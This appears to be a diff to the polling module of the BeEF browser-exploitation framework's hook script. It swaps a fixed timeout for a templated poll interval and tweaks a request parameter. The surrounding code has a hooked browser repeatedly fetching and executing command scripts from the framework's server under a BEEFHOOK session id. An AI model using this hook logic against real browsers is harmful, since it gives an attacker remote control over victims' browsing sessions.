@@ -14,7 +14,7 @@ beef.updater = {
 	// Low timeouts combined with the way the framework sends commamd modules result 
 	// in instructions being sent repeatedly or complex code. 
 	// If you suffer from ADHD, you can decrease this setting.
-	timeout: 5000,
+    xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
 	
 	// A lock.
 	lock: false,
@@ -42,22 +42,20 @@ beef.updater = {
 			beef.net.flush();
 			if(beef.commands.length > 0) {
 				this.execute_commands();
-			}
-
-            else {
+			}else {
 				this.get_commands();    /*Polling*/
 			}
 		}
 
       // ( typeof beef.websocket === "undefined")
-		setTimeout("beef.updater.check();", beef.updater.timeout);
+		setTimeout("beef.updater.check();", beef.updater.xhr_poll_timeout);
 	},
 	
 	// Gets new commands from the framework.
 	get_commands: function(http_response) {
 		try {
 			this.lock = true;
-            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
+            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
                 if (response.body != null && response.body.length > 0)
                     beef.updater.execute_commands();
             });
